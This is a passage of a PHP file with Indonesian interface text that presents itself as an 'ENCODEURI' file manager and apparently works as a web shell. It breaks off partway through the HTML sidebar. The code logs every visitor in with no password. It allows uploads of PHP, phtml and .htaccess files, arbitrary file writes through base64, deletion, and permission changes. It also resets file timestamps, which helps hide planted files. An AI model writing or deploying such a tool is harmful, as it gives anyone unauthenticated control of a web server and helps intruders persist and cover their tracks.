<?php session_start();
define("BRAND_SIGNATURE", "encodeuri");
if (strlen(BRAND_SIGNATURE) !== 9 || BRAND_SIGNATURE[3] !== 'o' || substr(BRAND_SIGNATURE, -1) !== 'i') {
    header("HTTP/1.1 500 Internal Server Error"); die("Core components missing.");
}

$_auto_user = function_exists("posix_getpwuid") && function_exists("posix_getuid") ? (posix_getpwuid(posix_getuid())["name"] ?? get_current_user()) : (get_current_user() ?: "unknown");
$_SESSION["logged_in"] = true;
$_SESSION['user_email'] = $_auto_user;
if (isset($_GET['logout'])) { session_destroy(); header("Location: ?"); exit; }

class LiteHelper {
    public static function formatSize($bytes) {
        $units = ['B','KB','MB','GB','TB'];
        for ($i = 0; $bytes > 1024; $i++) $bytes /= 1024;
        return round($bytes, 2) . ' ' . $units[$i];
    }
    public static function getPerms($file) {
        clearstatcache(); $perms = @fileperms($file);
        return $perms ? substr(sprintf('%o', $perms), -4) : '????';
    }
    public static function isOwned($file) {
        clearstatcache();
        $file_uid = @fileowner($file);
        $proc_uid = function_exists('posix_getuid') ? posix_getuid() : @getmyuid();
        if ($file_uid === false || $proc_uid === false) return null;
        return $file_uid === $proc_uid;
    }
    public static function getOwner($file) {
        clearstatcache(); $uid = @fileowner($file);
        if ($uid === false) return '?';
        if (function_exists('posix_getpwuid')) { $info = posix_getpwuid($uid); return $info ? $info['name'] : (string)$uid; }
        return (string)$uid;
    }
    public static function getMtime($file) {
        $mt = @filemtime($file); return $mt ? date('Y/m/d H:i', $mt) : '—';
    }
    public static function getMtimeRaw($file) {
        $mt = @filemtime($file); return $mt ? date('Y-m-d\TH:i', $mt) : '';
    }
    public static function getFileSize($file) {
        if (is_dir($file)) return '—';
        $s = @filesize($file); return $s !== false ? self::formatSize($s) : '?';
    }
    public static function getExtType($name, $is_dir) {
        if ($is_dir) return 'dir';
        $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
        $map = [
            'php'=>'php','phtml'=>'php','shtml'=>'php',
            'js'=>'js','ts'=>'js','jsx'=>'js','tsx'=>'js',
            'css'=>'css','scss'=>'css','less'=>'css',
            'html'=>'html','htm'=>'html',
            'jpg'=>'img','jpeg'=>'img','png'=>'img','gif'=>'img','webp'=>'img','svg'=>'img','ico'=>'img',
            'txt'=>'txt','md'=>'txt','log'=>'txt',
            'xml'=>'xml','json'=>'xml','yaml'=>'xml','yml'=>'xml',
            'zip'=>'zip','tar'=>'zip','gz'=>'zip','rar'=>'zip','7z'=>'zip',
            'sh'=>'sh','bash'=>'sh','zsh'=>'sh',
            'sql'=>'sql','db'=>'sql','sqlite'=>'sql',
            'htaccess'=>'cfg','env'=>'cfg','conf'=>'cfg','ini'=>'cfg',
        ];
        return $map[$ext] ?? 'file';
    }
}

$script_dir = str_replace('\\', '/', __DIR__);
$current_path = isset($_GET['path']) ? str_replace(['..','\\'], '', $_GET['path']) : $script_dir;
if (!is_dir($current_path)) $current_path = $script_dir;
$current_path = rtrim($current_path, '/');
$status_msg = ""; $status_type = "info";

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['upload'])) {
        $allowed = ['html','png','php','jpeg','jpg','txt','css','js','phtml','shtml','.htaccess','.xml'];
        $filename = $_FILES['upload']['name']; $tmp_name = $_FILES['upload']['tmp_name'];
        $ext = strtolower(pathinfo($filename, PATHINFO_EXTENSION));
        $target_file = $current_path . '/' . $filename;
        if (!in_array($ext, $allowed)) { $status_msg = "Ekstensi .$ext tidak diizinkan."; $status_type = "error"; }
        elseif (!is_writable($current_path)) { $status_msg = "Permission denied pada folder ini."; $status_type = "error"; }
        else {
            if (move_uploaded_file($tmp_name, $target_file)) { $status_msg = "Upload berhasil: $filename"; $status_type = "success"; }
            elseif (copy($tmp_name, $target_file)) { $status_msg = "Upload berhasil (copy): $filename"; $status_type = "success"; }
            else { $c=file_get_contents($tmp_name); if(file_put_contents($target_file,$c)!==false){$status_msg="Upload berhasil: $filename";$status_type="success";}else{$status_msg="Upload gagal total.";$status_type="error";} }
        }
    }
    if (isset($_POST['new_file_name'])) {
        $fname = str_replace(['/','\\','..'], '', $_POST['new_file_name']);
        if (!empty($fname)) { if(file_put_contents($current_path.'/'.$fname,"")!==false){$status_msg="File '$fname' berhasil dibuat.";$status_type="success";}else{$status_msg="Gagal membuat file.";$status_type="error";} }
    }
    if (isset($_POST['old_name'], $_POST['new_name'])) { @rename($current_path.'/'.$_POST['old_name'], $current_path.'/'.$_POST['new_name']); $status_msg="Rename berhasil ke ".$_POST['new_name']."."; $status_type="success"; }
    if (isset($_POST['new_folder'])) { @mkdir($current_path.'/'.$_POST['new_folder'], 0755); $status_msg="Folder '".$_POST['new_folder']."' dibuat."; $status_type="success"; }
    if (isset($_POST['edit_b64'])) { file_put_contents($current_path.'/'.$_POST['filename'], base64_decode($_POST['edit_b64'])); $status_msg=$_POST['filename']." berhasil disimpan."; $status_type="success"; }
    if (isset($_POST['bulk_delete'], $_POST['items'])) {
        $n=0; foreach($_POST['items'] as $item){$t=$current_path.'/'.str_replace(['..','/'],'',$item);is_dir($t)?@rmdir($t):@unlink($t);$n++;}
        $status_msg="$n item berhasil dihapus."; $status_type="success";
    }
    if (isset($_POST['chmod_file'], $_POST['chmod_val'])) {
        $t=$current_path.'/'.$_POST['chmod_file'];
        if(@chmod($t,octdec($_POST['chmod_val']))){$status_msg="Permission ".$_POST['chmod_file']." diubah ke ".$_POST['chmod_val'].".";$status_type="success";}
        else{$status_msg="Gagal mengubah permission ".$_POST['chmod_file'].".";$status_type="error";}
    }
    if (isset($_POST['touch_file'], $_POST['touch_time'])) {
        $t=$current_path.'/'.str_replace(['..','/'],'',$_POST['touch_file']);
        $ts=strtotime($_POST['touch_time']);
        if(!$ts){$status_msg="Format waktu tidak valid.";$status_type="error";}
        elseif(@touch($t,$ts,$ts)){$status_msg="Timestamp ".$_POST['touch_file']." diubah ke ".date('Y/m/d H:i',$ts).".";$status_type="success";}
        else{$status_msg="Gagal mengubah timestamp. Cek permission.";$status_type="error";}
    }
}
if (isset($_GET['delete'])) {
    $t=$current_path.'/'.$_GET['delete']; is_dir($t)?@rmdir($t):@unlink($t);
    header("Location: ?path=".urlencode($current_path)); exit;
}

$total_space  = disk_total_space($current_path);
$free_space   = disk_free_space($current_path);
$used_space   = $total_space - $free_space;
$used_percent = round(($used_space/$total_space)*100,1);
$items = scandir($current_path); $folders=$files=[];
foreach($items as $i){ if($i=='.'||$i=='..') continue; is_dir($current_path.'/'.$i)?$folders[]=$i:$files[]=$i; }
natcasesort($folders); natcasesort($files);
$sorted = array_merge($folders, $files);
$parts  = explode('/', trim($current_path,'/'));
$total_items   = count($sorted);
$total_files   = count($files);
$total_folders = count($folders);
$proc_user = function_exists('posix_getpwuid') && function_exists('posix_getuid')
    ? (posix_getpwuid(posix_getuid())['name'] ?? get_current_user())
    : (get_current_user() ?: '?');
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title><?php echo strtoupper(BRAND_SIGNATURE); ?> · File Manager</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
:root{
  --bg:    #0d1117;
  --s1:    #111827;
  --s2:    #151f2e;
  --s3:    #1a2638;
  --s4:    #1e2d3d;
  --s5:    #243447;
  --bd:    #1e2d3d;
  --bd2:   #263547;
  --bd3:   #2e4060;
  --tx:    #e2e8f0;
  --tx2:   #94a3b8;
  --tx3:   #4e6278;
  --tx4:   #2d4155;
  --ac:    #5b8dee;
  --ac2:   #3b6fd4;
  --ac3:   #1a4fb0;
  --acl:   #7aa3f0;
  --grn:   #34d399;
  --grn2:  #10b981;
  --red:   #f87171;
  --red2:  #ef4444;
  --org:   #fb923c;
  --ylw:   #fbbf24;
  --pur:   #a78bfa;
  --cya:   #22d3ee;
  --pnk:   #f472b6;
  --sw:    204px;
  --hh:    48px;
  --ff:    'Inter', system-ui, sans-serif;
  --fm:    'JetBrains Mono', monospace;
}
html,body{height:100%;overflow:hidden}
body{font-family:var(--ff);background:var(--bg);color:var(--tx);font-size:13px;display:flex;flex-direction:column}

/* ── TOPBAR ── */
.topbar{height:var(--hh);background:var(--s1);border-bottom:1px solid var(--bd);
  display:flex;align-items:center;padding:0 16px;gap:12px;flex-shrink:0;z-index:100}

.t-logo{display:flex;align-items:center;gap:8px;flex-shrink:0}
.t-logo-icon{width:28px;height:28px;background:var(--ac);border-radius:7px;
  display:flex;align-items:center;justify-content:center}
.t-logo-icon svg{width:15px;height:15px;color:#fff}
.t-logo-text{font-size:13px;font-weight:600;color:var(--tx);letter-spacing:-.01em}
.t-logo-sub{font-size:10px;color:var(--tx3);font-weight:400;margin-left:1px}

.t-divider{width:1px;height:20px;background:var(--bd2);flex-shrink:0}

.t-path{flex:1;background:var(--bg);border:1px solid var(--bd);border-radius:6px;
  padding:0 10px;height:30px;display:flex;align-items:center;gap:3px;
  overflow:hidden;font-family:var(--fm);font-size:11px;color:var(--tx3)}
.t-path .sep{color:var(--tx4);margin:0 1px}
.t-path a{color:var(--tx2);text-decoration:none;transition:color .12s}
.t-path a:hover{color:var(--acl)}
.t-path a:last-child{color:var(--tx)}

.t-right{display:flex;align-items:center;gap:8px;flex-shrink:0}
.t-user{display:flex;align-items:center;gap:7px;padding:4px 10px;
  background:var(--s2);border:1px solid var(--bd);border-radius:20px}
.t-user-dot{width:7px;height:7px;border-radius:50%;background:var(--grn);
  box-shadow:0 0 0 2px rgba(52,211,153,.2)}
.t-user-name{font-size:11px;color:var(--tx2);font-weight:500}
.btn-exit{display:flex;align-items:center;gap:5px;font-size:12px;padding:5px 12px;
  border-radius:6px;border:1px solid var(--bd2);background:transparent;
  color:var(--tx2);cursor:pointer;text-decoration:none;font-family:var(--ff);
  transition:all .15s;font-weight:500}
.btn-exit:hover{border-color:rgba(248,113,113,.4);background:rgba(248,113,113,.08);color:var(--red)}
.btn-exit svg{width:13px;height:13px}

/* ── LAYOUT ── */
.layout{display:flex;flex:1;overflow:hidden}

/* ── SIDEBAR ── */
.sidebar{width:var(--sw);background:var(--s1);border-right:1px solid var(--bd);
  display:flex;flex-direction:column;overflow-y:auto;flex-shrink:0}

.sb-head{padding:14px 14px 10px;border-bottom:1px solid var(--bd)}
.sb-head-label{font-size:9px;font-weight:600;letter-spacing:.1em;text-transform:uppercase;
  color:var(--tx4);margin-bottom:5px}
.sb-head-path{font-size:11px;color:var(--tx2);font-weight:500;white-space:nowrap;
  overflow:hidden;text-overflow:ellipsis;font-family:var(--fm)}

.sb-sec{padding:10px 0 4px}
.sb-lbl{font-size:9px;font-weight:600;letter-spacing:.1em;text-transform:uppercase;
  color:var(--tx4);padding:0 14px 5px}

.smn{display:flex;align-items:center;gap:8px;padding:6px 14px;font-size:12px;
  color:var(--tx2);cursor:pointer;border:none;background:none;width:100%;
  text-align:left;font-family:var(--ff);transition:all .12s;border-radius:0;
  font-weight:400;text-decoration:none;position:relative}
.smn:hover{background:var(--s3);color:var(--tx)}
.smn.active{background:rgba(91,141,238,.1);color:var(--acl)}
.smn.active::before{content:'';position:absolute;left:0;top:3px;bottom:3px;
  width:2px;background:var(--ac);border-radius:0 2px 2px 0}
.smn svg{width:14px;height:14px;flex-shrink:0;opacity:.6}
.smn:hover svg,.smn.active svg{opacity:1}
.smn-badge{margin-left:auto;font-size:10px;background:var(--s4);border:1px solid var(--bd);
  border-radius:4px;padding:1px 6px;color:var(--tx3);font-family:var(--fm)}
.smn-sep{height:1px;background:var(--bd);margin:6px 0}

/* Disk */
.disk-w{padding:12px 14px;border-top:1px solid var(--bd);margin-top:auto}
.disk-top{display:flex;justify-content:space-between;font-size:11px;
  color:var(--tx2);margin-bottom:6px;font-weight:500}
.disk-top .val{color:var(--ac)}
.disk-track{background:var(--s3);border-radius:4px;height:4px;overflow:hidden}
.disk-fill{height:100%;border-radius:4px;background:var(--ac);transition:width .5s}
.disk-fill.warn{background:var(--ylw)}
.disk-fill.danger{background:var(--red)}
.disk-sub{font-size:10px;color:var(--tx3);margin-top:5px;font-family:var(--fm)}

/* Legend */
.legend{padding:8px 14px 4px}
.legend-row{display:flex;align-items:center;gap:7px;padding:3px 0;font-size:11px;color:var(--tx3)}
.leg-dot{width:8px;height:8px;border-radius:2px;flex-shrink:0}

/* ── MAIN ── */
.main{flex:1;display:flex;flex-direction:column;overflow:hidden}

/* TOOLBAR */
.toolbar{background:var(--s1);border-bottom:1px solid var(--bd);
  padding:8px 14px;display:flex;align-items:center;gap:6px;flex-wrap:wrap;flex-shrink:0}
.t-sep{width:1px;height:18px;background:var(--bd2);margin:0 2px;flex-shrink:0}

.tbtn{display:inline-flex;align-items:center;gap:5px;padding:5px 11px;
  border-radius:6px;border:1px solid var(--bd2);background:var(--s2);
  color:var(--tx2);font-size:12px;cursor:pointer;text-decoration:none;
  font-family:var(--ff);transition:all .12s;white-space:nowrap;height:30px;font-weight:500}
.tbtn:hover{border-color:var(--bd3);background:var(--s3);color:var(--tx)}
.tbtn.pri{border-color:rgba(91,141,238,.45);background:rgba(91,141,238,.1);color:var(--acl)}
.tbtn.pri:hover{background:rgba(91,141,238,.2);border-color:rgba(91,141,238,.6)}
.tbtn.dng{border-color:rgba(248,113,113,.35);background:rgba(248,113,113,.07);color:var(--red)}
.tbtn.dng:hover{background:rgba(248,113,113,.15)}
.tbtn svg{width:13px;height:13px;flex-shrink:0}

.t-in{background:var(--bg);border:1px solid var(--bd2);border-radius:6px;
  color:var(--tx);font-size:12px;outline:none;height:30px;padding:0 10px;
  font-family:var(--ff);transition:border-color .12s}
.t-in:focus{border-color:rgba(91,141,238,.5);box-shadow:0 0 0 3px rgba(91,141,238,.08)}
.t-in::placeholder{color:var(--tx4)}

/* ALERT */
.alert{padding:8px 14px;font-size:12px;display:flex;align-items:center;gap:8px;
  flex-shrink:0;font-weight:500}
.alert svg{width:14px;height:14px;flex-shrink:0}
.alert.success{background:rgba(52,211,153,.07);border-bottom:1px solid rgba(52,211,153,.18);color:#6ee7b7}
.alert.error  {background:rgba(248,113,113,.07);border-bottom:1px solid rgba(248,113,113,.18);color:var(--red)}
.alert.info   {background:rgba(91,141,238,.07);border-bottom:1px solid rgba(91,141,238,.18);color:var(--acl)}
.alert-close{margin-left:auto;cursor:pointer;opacity:.5;background:none;border:none;
  color:inherit;font-size:16px;line-height:1;padding:0 2px}
.alert-close:hover{opacity:1}

/* FILE TABLE */
.ftw{flex:1;overflow-y:auto}
table{width:100%;border-collapse:collapse}
thead th{position:sticky;top:0;background:var(--s2);border-bottom:1px solid var(--bd2);
  padding:7px 12px;font-size:10px;font-weight:600;text-transform:uppercase;
  letter-spacing:.08em;color:var(--tx3);text-align:left;user-select:none;white-space:nowrap}
thead th:first-child{width:34px;padding-left:14px}
thead th.sortable{cursor:pointer}
thead th.sortable:hover{color:var(--tx2)}

tbody tr{border-bottom:1px solid rgba(30,45,61,.7);transition:background .08s}
tbody tr:hover{background:var(--s2)}
tbody tr:hover .fn-name{color:var(--acl)}
tbody td{padding:6px 12px;vertical-align:middle}
tbody td:first-child{padding-left:14px}

/* File icon badges */
.fi-badge{flex-shrink:0;width:32px;height:24px;border-radius:5px;
  display:flex;align-items:center;justify-content:center;
  font-size:8px;font-weight:700;letter-spacing:.04em;border:1px solid}
.fi-dir      {background:rgba(91,141,238,.1); border-color:rgba(91,141,238,.25); color:var(--acl)}
.fi-dir.own  {background:rgba(52,211,153,.1); border-color:rgba(52,211,153,.3);  color:var(--grn)}
.fi-dir.other{background:rgba(248,113,113,.1);border-color:rgba(248,113,113,.28);color:var(--red)}
.fi-php  {background:rgba(167,139,250,.1); border-color:rgba(167,139,250,.28);color:var(--pur)}
.fi-js   {background:rgba(251,191,36,.1);  border-color:rgba(251,191,36,.28); color:var(--ylw)}
.fi-css  {background:rgba(34,211,238,.1);  border-color:rgba(34,211,238,.28); color:var(--cya)}
.fi-html {background:rgba(251,146,60,.1);  border-color:rgba(251,146,60,.28); color:var(--org)}
.fi-img  {background:rgba(244,114,182,.1); border-color:rgba(244,114,182,.28);color:var(--pnk)}
.fi-txt  {background:rgba(148,163,184,.1); border-color:rgba(148,163,184,.2); color:var(--tx2)}
.fi-xml  {background:rgba(251,191,36,.1);  border-color:rgba(251,191,36,.2);  color:#e6b800}
.fi-zip  {background:rgba(248,113,113,.1); border-color:rgba(248,113,113,.25);color:var(--red)}
.fi-sh   {background:rgba(52,211,153,.1);  border-color:rgba(52,211,153,.28); color:var(--grn)}
.fi-sql  {background:rgba(91,141,238,.1);  border-color:rgba(91,141,238,.2);  color:#7aa3f0}
.fi-cfg  {background:rgba(148,163,184,.08);border-color:rgba(148,163,184,.18);color:#64748b}
.fi-file {background:var(--s3);            border-color:var(--bd);            color:var(--tx3)}

/* File name */
.fn{display:flex;align-items:center;gap:9px}
.fn-name{font-size:13px;color:var(--tx);white-space:nowrap;overflow:hidden;
  text-overflow:ellipsis;max-width:250px;transition:color .1s;font-weight:400}
.fn-name a{color:inherit;text-decoration:none}
.fn-name a:hover{color:var(--acl)}
.fn-name.is-dir{font-weight:500}

/* Tooltip */
.fn-tip{position:fixed;background:var(--s3);border:1px solid var(--bd3);
  border-radius:6px;padding:5px 10px;font-size:11px;color:var(--tx);
  z-index:500;pointer-events:none;opacity:0;transition:opacity .15s;
  max-width:380px;word-break:break-all;box-shadow:0 8px 24px rgba(0,0,0,.4);
  font-family:var(--fm)}

/* Perm */
.perm{font-family:var(--fm);font-size:11px;color:var(--tx2);
  background:var(--s3);border:1px solid var(--bd);border-radius:4px;
  padding:2px 7px;cursor:pointer;text-decoration:none;display:inline-block;
  transition:all .12s;font-weight:500}
.perm:hover{border-color:var(--ac);color:var(--acl);background:rgba(91,141,238,.08)}

/* Owner */
.own-badge{font-size:10px;border-radius:4px;padding:2px 7px;
  font-family:var(--fm);white-space:nowrap;font-weight:500}
.own-badge.own  {background:rgba(52,211,153,.1);color:#6ee7b7;border:1px solid rgba(52,211,153,.22)}
.own-badge.other{background:rgba(248,113,113,.1);color:#fca5a5;border:1px solid rgba(248,113,113,.22)}
.own-badge.unk  {background:var(--s3);color:var(--tx3);border:1px solid var(--bd)}

/* Mtime */
.mtime{font-family:var(--fm);font-size:11px;color:var(--tx3);white-space:nowrap;
  cursor:pointer;border-bottom:1px dashed var(--bd3);transition:all .12s;font-weight:400}
.mtime:hover{color:var(--acl);border-bottom-color:var(--acl)}

/* Size */
.fsize{font-family:var(--fm);font-size:11px;color:var(--tx3)}

/* Action buttons */
.acts{display:flex;gap:4px}
.ab{font-size:11px;padding:3px 8px;border-radius:5px;border:1px solid var(--bd);
  background:transparent;color:var(--tx3);cursor:pointer;text-decoration:none;
  font-family:var(--ff);transition:all .1s;white-space:nowrap;font-weight:500}
.ab:hover{background:var(--s3);color:var(--tx);border-color:var(--bd2)}
.ab.r{border-color:rgba(248,113,113,.2);color:rgba(248,113,113,.6)}
.ab.r:hover{background:rgba(248,113,113,.1);color:var(--red);border-color:rgba(248,113,113,.4)}
.ab.b{border-color:rgba(91,141,238,.2);color:rgba(91,141,238,.7)}
.ab.b:hover{background:rgba(91,141,238,.1);color:var(--acl);border-color:rgba(91,141,238,.4)}

input[type="checkbox"]{accent-color:var(--ac);cursor:pointer;width:13px;height:13px}

/* BULK BAR */
.bulk{background:rgba(91,141,238,.05);border-top:1px solid rgba(91,141,238,.15);
  padding:8px 14px;display:flex;align-items:center;gap:8px;font-size:12px;
  color:var(--tx2);flex-shrink:0;font-weight:500}

/* STATS BAR */
.statsbar{background:var(--s1);border-top:1px solid var(--bd);
  padding:5px 14px;display:flex;align-items:center;gap:14px;
  flex-shrink:0;font-size:11px;color:var(--tx3)}
.sb-item{display:flex;align-items:center;gap:5px}
.sb-item .lbl{color:var(--tx4);font-weight:500}
.sb-item .val{color:var(--tx2);font-family:var(--fm)}
.sb-item .val.hi{color:var(--acl)}
.sb-pipe{color:var(--tx4)}
.sb-right{margin-left:auto;display:flex;align-items:center;gap:14px}
.sb-clock{color:var(--ac);font-family:var(--fm);font-size:11px;font-weight:500}

/* EMPTY */
.empty-state{display:flex;flex-direction:column;align-items:center;justify-content:center;
  padding:60px 20px;gap:10px}
.empty-icon{width:44px;height:44px;background:var(--s3);border:1px solid var(--bd2);
  border-radius:10px;display:flex;align-items:center;justify-content:center}
.empty-icon svg{width:22px;height:22px;color:var(--tx3)}
.empty-title{font-size:14px;font-weight:500;color:var(--tx2)}
.empty-sub{font-size:12px;color:var(--tx3)}

/* EDITOR */
.editor{background:var(--s1);border-top:1px solid var(--bd);
  flex-shrink:0;display:flex;flex-direction:column;max-height:48vh}
.editor-hdr{display:flex;align-items:center;gap:8px;padding:8px 14px;
  border-bottom:1px solid var(--bd);font-size:12px;color:var(--tx2)}
.editor-fn{color:var(--org);font-family:var(--fm);font-weight:500}
.editor-mode{font-size:10px;color:var(--tx3);background:var(--s3);
  border:1px solid var(--bd);border-radius:4px;padding:1px 7px}
.editor-acts{margin-left:auto;display:flex;gap:6px}
textarea.editor-ta{flex:1;background:#0a0f1a;color:#cbd5e1;border:none;
  font-family:var(--fm);font-size:12px;line-height:1.65;
  padding:12px 16px;resize:none;outline:none;min-height:180px;caret-color:var(--acl)}

/* TOUCH POPUP */
.touch-popup{position:fixed;z-index:999;background:var(--s2);
  border:1px solid var(--bd3);border-radius:8px;padding:12px 14px;
  box-shadow:0 8px 32px rgba(0,0,0,.5);display:none;flex-direction:column;
  gap:10px;min-width:250px}
.touch-popup.show{display:flex}
.touch-popup-title{font-size:12px;color:var(--tx2);display:flex;align-items:center;
  gap:7px;font-weight:500}
.touch-popup-title svg{width:14px;height:14px;color:var(--acl)}
.touch-fname{color:var(--org);font-family:var(--fm);max-width:160px;
  overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
.touch-popup input[type="datetime-local"]{background:var(--bg);border:1px solid var(--bd2);
  border-radius:6px;color:var(--tx);font-family:var(--fm);font-size:12px;
  padding:6px 10px;outline:none;width:100%;color-scheme:dark;
  transition:border-color .12s}
.touch-popup input[type="datetime-local"]:focus{border-color:rgba(91,141,238,.5)}
.touch-popup-btns{display:flex;gap:6px}
.touch-popup-btns button{flex:1;font-size:12px;padding:6px 0;border-radius:6px;
  cursor:pointer;font-family:var(--ff);font-weight:500;transition:all .12s}
.touch-popup-btns button:first-child{background:rgba(91,141,238,.12);
  border:1px solid rgba(91,141,238,.4);color:var(--acl)}
.touch-popup-btns button:first-child:hover{background:rgba(91,141,238,.22)}
.touch-popup-btns button:last-child{background:transparent;
  border:1px solid var(--bd2);color:var(--tx3)}
.touch-popup-btns button:last-child:hover{color:var(--tx);border-color:var(--bd3)}

/* Scrollbar */
::-webkit-scrollbar{width:5px;height:5px}
::-webkit-scrollbar-track{background:transparent}
::-webkit-scrollbar-thumb{background:var(--s4);border-radius:3px}
::-webkit-scrollbar-thumb:hover{background:var(--s5)}

/* Row animation */
tbody tr{animation:rowFade .18s ease both}
@keyframes rowFade{from{opacity:0;transform:translateY(3px)}to{opacity:1;transform:none}}

/* Panel inline */
.p-inline{display:none}
.p-inline.show{display:flex;align-items:center;gap:5px}

/* ── EXTRA EFFECTS ── */

/* Ambient particles canvas (behind everything) */
#ambient-canvas{position:fixed;top:0;left:0;width:100%;height:100%;
  pointer-events:none;z-index:0;opacity:.35}
.topbar,.layout{position:relative;z-index:1}

/* Topbar accent line shimmer */
.topbar::after{content:'';position:absolute;bottom:0;left:0;right:0;height:1px;
  background:linear-gradient(90deg,transparent 0%,var(--ac3) 20%,var(--ac) 50%,var(--ac3) 80%,transparent 100%);
  background-size:200% 100%;animation:shimmer 3s ease-in-out infinite;opacity:.6}
@keyframes shimmer{0%{background-position:200% 0}100%{background-position:-200% 0}}

/* Logo icon subtle pulse */
.t-logo-icon{animation:logoPulse 4s ease-in-out infinite}
@keyframes logoPulse{0%,100%{box-shadow:0 0 0 0 rgba(91,141,238,.0)}
  50%{box-shadow:0 0 0 6px rgba(91,141,238,.12)}}

/* File badge hover glow */
.fi-badge{transition:transform .15s,box-shadow .15s}
tbody tr:hover .fi-badge{transform:scale(1.08);box-shadow:0 0 10px rgba(91,141,238,.25)}
tbody tr:hover .fi-dir.own{box-shadow:0 0 10px rgba(52,211,153,.3)}
tbody tr:hover .fi-dir.other{box-shadow:0 0 10px rgba(248,113,113,.3)}

/* Row left-border accent on hover */
tbody tr{border-left:2px solid transparent;transition:background .08s,border-color .15s}
tbody tr:hover{border-left-color:var(--ac)}

/* Active menu item glow */
.smn.active{text-shadow:none}
.smn.active::before{box-shadow:0 0 6px var(--ac)}

/* Disk fill animated shimmer when normal */
.disk-fill{position:relative;overflow:hidden}
.disk-fill::after{content:'';position:absolute;top:0;left:-100%;width:60%;height:100%;
  background:linear-gradient(90deg,transparent,rgba(255,255,255,.2),transparent);
  animation:diskShimmer 2.5s ease-in-out infinite}
@keyframes diskShimmer{0%{left:-60%}100%{left:160%}}

/* Stats bar clock blink colon */
#sb-clock{letter-spacing:.05em}

/* Sidebar bottom disk widget pulse dot */
.t-user-dot{animation:dotPulse 2.5s ease-in-out infinite}
@keyframes dotPulse{0%,100%{box-shadow:0 0 0 0 rgba(52,211,153,.5)}
  60%{box-shadow:0 0 0 5px rgba(52,211,153,.0)}}

/* Smooth focus ring on all inputs */
.t-in:focus,.touch-popup input:focus{
  box-shadow:0 0 0 3px rgba(91,141,238,.15),0 0 12px rgba(91,141,238,.08)}

/* File row stagger already in rowFade — add subtle slide-up on search filter */
.file-row{transition:opacity .15s}

/* Perm badge micro-bounce on hover */
.perm{transition:all .15s}
.perm:hover{transform:translateY(-1px);box-shadow:0 3px 8px rgba(91,141,238,.2)}

/* tbtn active press */
.tbtn:active{transform:scale(.97)}
.ab:active{transform:scale(.96)}
</style>
</head>
<body>
<canvas id="ambient-canvas"></canvas>

<!-- ── TOPBAR ── -->
<div class="topbar">
  <div class="t-logo">
    <div class="t-logo-icon">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2">
        <path d="M3 6h18M3 12h18M3 18h12" stroke-linecap="round"/>
      </svg>
    </div>
    <div>
      <div class="t-logo-text"><?php echo strtoupper(BRAND_SIGNATURE); ?></div>
      <div class="t-logo-sub">File Manager</div>
    </div>
  </div>

  <div class="t-divider"></div>

  <div class="t-path">
    <a href="?path=<?php echo urlencode($script_dir); ?>">~</a>
    <?php
    $build = "";
    foreach ($parts as $p) {
        $build .= "/".$p;
        echo '<span class="sep">/</span><a href="?path='.urlencode($build).'">'.htmlspecialchars($p).'</a>';
    }
    ?>
  </div>

  <div class="t-right">
    <div class="t-user">
      <span class="t-user-dot"></span>
      <span class="t-user-name"><?php echo htmlspecialchars($_SESSION['user_email']); ?></span>
    </div>
    <a href="?logout=1" class="btn-exit">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M9 21H5a2 2 0 01-2-2V5a2 2 0 012-2h4M16 17l5-5-5-5M21 12H9" stroke-linecap="round" stroke-linejoin="round"/></svg>
      Keluar
    </a>
  </div>
</div>

<div class="layout">

<!-- ── SIDEBAR ── -->
<div class="sidebar">
  <div class="sb-head">
    <div class="sb-head-label">Direktori aktif</div>
    <div class="sb-head-path">/<?php echo htmlspecialchars(basename($current_path)); ?></div>
  </div>

  <div class="sb-sec">
    <div class="sb-lbl">Aksi</div>
    <button class="smn" onclick="document.getElementById('up-inp').click()">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M21 15v4a2 2 0 01-2 2H5a2 2 0 01-2-2v-4M17 8l-5-5-5 5M12 3v12" stroke-linecap="round" stroke-linejoin="round"/></svg>
      Upload File
    </button>
    <button class="smn" onclick="togglePanel('pnf')">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M14 2H6a2 2 0 00-2 2v16a2 2 0 002 2h12a2 2 0 002-2V8l-6-6z" stroke-linecap="round" stroke-linejoin="round"/><path d="M14 2v6h6M12 11v6M9 14h6" stroke-linecap="round"/></svg>
      File Baru
    </button>
    <button class="smn" onclick="togglePanel('pnd')">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M22 19a2 2 0 01-2 2H4a2 2 0 01-2-2V5a2 2 0 012-2h5l2 3h9a2 2 0 012 2z" stroke-linecap="round" stroke-linejoin="round"/><path d="M12 11v6M9 14h6" stroke-linecap="round"/></svg>
      Folder Baru
    </button>
  </div>

  <div class="smn-sep"></div>

  <div class="sb-sec">
    <div class="sb-lbl">Navigasi</div>
    <?php $parent = dirname($current_path); if ($parent !== $current_path): ?>
    <a class="smn" href="?path=<?php echo urlencode($parent); ?>">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M15 18l-6-6 6-6" stroke-linecap="round" stroke-linejoin="round"/></svg>
      Kembali
    </a>
    <?php endif; ?>
    <a class="smn" href="?path=<?php echo urlencode($script_dir); ?>">
      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8"><path d="M3 9l9-7 9 7v11a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" stroke-linecap="round" stroke-linejoin="round"/><path d="M9 22V12h6v10" stroke-linecap="round"/></svg>
      Root
    </a>
    <a class="smn" href="?path=<?php echo urlencode($current_path); ?>">
